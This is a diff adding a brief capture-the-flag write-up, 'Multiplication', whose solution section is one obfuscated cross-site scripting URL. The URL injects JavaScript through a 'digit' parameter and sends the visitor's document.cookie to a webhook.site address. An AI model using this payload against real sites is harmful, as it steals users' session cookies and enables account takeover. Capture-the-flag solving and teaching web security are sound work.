@@ -1,0 +1,14 @@
+# Multiplication
+
+Description:
+```
+Multiplication is very easy, right? right??
+
+Link: xxx
+Author: daffainfo"
+```
+### How to Solve
+
+```
+http://app:8080/?digit=2+instanceof+[location+=+%27javascript\x3alocation\x3D\x27\x2F\x2Fwebhook\x2Esite\x2F79fab17f\x2D1c1b\x2D440c\x2D8d24\x2D2e3a7e995ee5\x2F\x3Fx\x3D\x27\x2Bdocument\x2Ecookie%27]
+```
